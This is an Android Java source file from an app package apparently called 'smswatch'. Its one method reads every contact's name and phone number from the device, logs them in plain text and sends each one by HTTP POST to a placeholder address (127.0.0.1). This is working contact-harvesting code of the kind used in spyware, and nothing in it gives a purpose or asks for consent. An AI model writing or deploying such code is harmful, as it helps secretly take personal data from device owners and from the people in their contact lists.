package com.wei.smswatch;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import java.util.HashMap;
import java.util.Map;


public class getContact{
    public static void getAllContacts(Context context) throws Exception {
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        while (cursor.moveToNext()) {

            String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
            while (phone.moveToNext()) {
                Map<String,String> pmap = new HashMap<String, String>();
                Map<String,String> hmap = new HashMap<String, String>();
                String PhoneNumber = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                String PhoneName = phone.getString(phone.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                PhoneNumber = PhoneNumber.replace("-", "");
                PhoneNumber = PhoneNumber.replace(" ", "");
                Log.i("smswatch",ContactId);
                Log.i("snswatch",PhoneName);
                Log.i("smswatch",PhoneNumber);
                pmap.put(PhoneName, PhoneNumber);
                hmap.put("abc","123");
                HttpRequestUtil.sendPost("http://127.0.0.1", pmap, hmap);
            }


        }
    }
}